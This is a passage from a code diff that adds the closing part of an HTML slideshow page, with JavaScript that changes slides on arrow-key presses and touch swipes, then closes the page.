+            else if (e.key === 'ArrowLeft') { changeSlide(-1); }
+        });
+
+        let touchStartX = 0;
+        document.addEventListener('touchstart', e => { touchStartX = e.changedTouches[0].screenX; });
+        document.addEventListener('touchend', e => {
+            let touchEndX = e.changedTouches[0].screenX;
+            if (touchStartX - touchEndX > 50) { changeSlide(1); } 
+            else if (touchEndX - touchStartX > 50) { changeSlide(-1); }
+        });
+
+        updateSlide();
+    </script>
+</body>
+</html>
